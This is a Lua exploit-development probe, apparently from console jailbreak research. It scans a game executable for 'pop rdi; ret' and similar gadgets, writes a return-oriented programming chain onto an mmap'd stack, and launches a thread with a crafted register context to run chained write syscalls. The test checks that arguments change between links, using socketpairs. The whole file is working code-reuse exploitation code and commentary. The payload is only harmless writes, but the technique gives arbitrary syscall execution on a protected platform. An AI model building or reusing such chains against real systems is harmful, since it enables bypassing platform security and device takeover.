-- CRASH_CLASS: HIGH
-- PROBE 409a: change an argument between links with a pop gadget
--
-- 408a proved the chain executes 8 writes with fixed arguments. A chain that can only
-- repeat one call is a storm; a chain that can change its arguments is a program. 403a
-- found six `pop rdi; ret` byte hits in eboot; this walks two socketpairs:
--   write(fd_a, ...)  then  pop rdi -> fd_c  then  write(fd_c, ...)  then park
-- If the pop gadget is real the second 16 bytes arrive on the OTHER pair's peer.

print("=== PROBE 409a: ARG GADGETS ===")

local REPS = 8
local SYS_WRITE = 4

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, rv = pcall(function()
        return sc(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), uint64(a5 or 0), uint64(a6 or 0))
    end)
    if not ok then return -999 end
    if type(rv) == "table" and rv.h then
        local h, l = to_num(rv.h), to_num(rv.l)
        if h >= 2147483648 then h = h - 4294967296 end
        if l >= 2147483648 then l = l - 4294967296 end
        if h == -1 and l == -1 then return -1 end
        return h * 4294967296 + l
    end
    local n = to_num(rv)
    if n >= 9223372036854775808 then n = n - 18446744073709551616 end
    return n
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end
local function u64v(v) return u64(math.floor(v / 4294967296), v % 4294967296) end

-- [A] socketpair first: a failure here is unambiguous
local sv = memory.alloc(0x10)
memory.write_qword(sv, u64(0, 0))
local sv2 = memory.alloc(0x10)
memory.write_qword(sv2, u64(0, 0))
local rv = call(135, 1, 1, 0, sgn(sv), 0, 0)
local rv2 = call(135, 1, 1, 0, sgn(sv2), 0, 0)
print(string.format("[A] socketpair rv=%d/%d", rv, rv2))
if rv ~= 0 then print("=== 409a DONE ===") return end
local fd_a = to_num(memory.read_dword(sv))
local fd_b = to_num(memory.read_dword(sv + 4))
local fd_c = to_num(memory.read_dword(sv2))
local fd_d = to_num(memory.read_dword(sv2 + 4))
print(string.format("[A] fd_a=%d fd_b=%d fd_c=%d fd_d=%d", fd_a, fd_b, fd_c, fd_d))
if fd_a <= 0 or fd_b <= 0 then print("=== 409a DONE ===") return end

-- [B] gadgets from eboot's readable text
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local irv = call(593, 0, sgn(info), 0, 0, 0, 0)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local size = to_num(memory.read_dword(info + 0x110))
if size > 0x600000 then size = 0x600000 end
print(string.format("[B] base=0x%X size=0x%X rv=%d", base, size, irv))
if base <= 0 or size <= 0 then print("=== 409a DONE ===") return end
local buf
do
    local ok, b = pcall(function() return memory.read_buffer(base, size) end)
    if not ok or type(b) ~= "string" then print("=== 409a DONE ===") return end
    buf = b
end
local park, pop_rax, pop_rdi = 0, 0, 0
do
    local i = 1
    while i < #buf - 1 do
        local x, y = buf:byte(i, i + 1)
        if x == 0xEB and y == 0xFE and park == 0 then park = base + i - 1 end
        if x == 0x58 and y == 0xC3 and pop_rax == 0 then pop_rax = base + i - 1 end
        if x == 0x5F and y == 0xC3 and pop_rdi == 0 then pop_rdi = base + i - 1 end
        if park ~= 0 and pop_rax ~= 0 and pop_rdi ~= 0 then break end
        i = i + 1
    end
end
local gadget = 0
pcall(function() gadget = to_num(syscall.syscall_address) end)
print(string.format("[B] park=0x%X pop_rax=0x%X pop_rdi=0x%X gadget=0x%X", park, pop_rax, pop_rdi, gadget))
if park <= 0 or pop_rax <= 0 or pop_rdi <= 0 or gadget <= 0 then print("=== 409a DONE ===") return end

-- [C] shared argument page
local argbuf = memory.alloc(0x40)
do
    local s = "ABCDEFGHIJKLMNOP"
    local i = 1
    while i <= #s do memory.write_byte(argbuf + i - 1, s:byte(i)); i = i + 1 end
end
local stack = sgn((function() return call(477, 0, 0x8000, 3, 0x1002, 0xFFFFFFFF, 0) end)())
print(string.format("[C] argbuf=0x%X stack=0x%X", sgn(argbuf), stack))
if stack <= 0 then print("=== 409a DONE ===") return end

local rsp = stack + 0x2000
local p = rsp
local function wq(v) memory.write_qword(p, u64v(v)); p = p + 8 end
wq(SYS_WRITE)
local i = 0
while i < REPS do
    wq(gadget)
    if i < REPS - 1 then
        wq(pop_rax)
        wq(SYS_WRITE)
    end
    i = i + 1
end
-- after the last write's ret: change RDI to the second pair, write again, park
wq(pop_rdi)
wq(fd_c)
wq(pop_rax)
wq(SYS_WRITE)
wq(gadget)
wq(park)

-- [D] the child thread: RDI = socket, RSI = string, RDX = 16, never changes
local ctx = memory.alloc(0x500)
do
    local k = 0
    while k < 0x500 do memory.write_dword(ctx + k, 0); k = k + 4 end
end
memory.write_qword(ctx + 0x108, u64(0, 0x480))
memory.write_qword(ctx + 0x110, u64(0, 0x10000))
memory.write_qword(ctx + 0x0c0, u64(0, 0x43))
memory.write_qword(ctx + 0x0e0, u64v(pop_rax))
memory.write_qword(ctx + 0x0f0, u64(0, 0x202))
memory.write_qword(ctx + 0x0f8, u64v(rsp))
memory.write_qword(ctx + 0x100, u64(0, 0x3b))
memory.write_qword(ctx + 0x048, u64v(fd_a))
memory.write_qword(ctx + 0x050, u64v(sgn(argbuf)))
memory.write_qword(ctx + 0x058, u64(0, 16))
print("[D] context ready")

local out = memory.alloc(0x20)
memory.write_qword(out, u64(0, 0))
local trv = call(430, sgn(ctx), sgn(out), 0, 0, 0, 0)
local tq = memory.read_qword(out)
local tl = 0
if type(tq) == "table" then tl = to_num(tq.l) else tl = to_num(tq) end
print(string.format("[D] thr_create rv=%d tid=0x%X", trv, tl))

-- [E] let the child run, then count what arrived
local t = 0
while t < 20000000 do t = t + 1 end
local rbuf = memory.alloc(0x400)
local rbuf2 = memory.alloc(0x400)
local total, total2 = 0, 0
local round = 0
while round < 8 do
    local n = call(29, fd_b, sgn(rbuf), 0x400, 0x80, 0, 0)
    if n <= 0 then break end
    total = total + n
    round = round + 1
end
local round2 = 0
while round2 < 8 do
    local n = call(29, fd_d, sgn(rbuf2), 0x400, 0x80, 0, 0)
    if n <= 0 then break end
    total2 = total2 + n
    round2 = round2 + 1
end
print(string.format("[E] pair1=%d pair2=%d (expected %d then 16)", total, total2, REPS * 16))
print("=== 409a DONE ===")
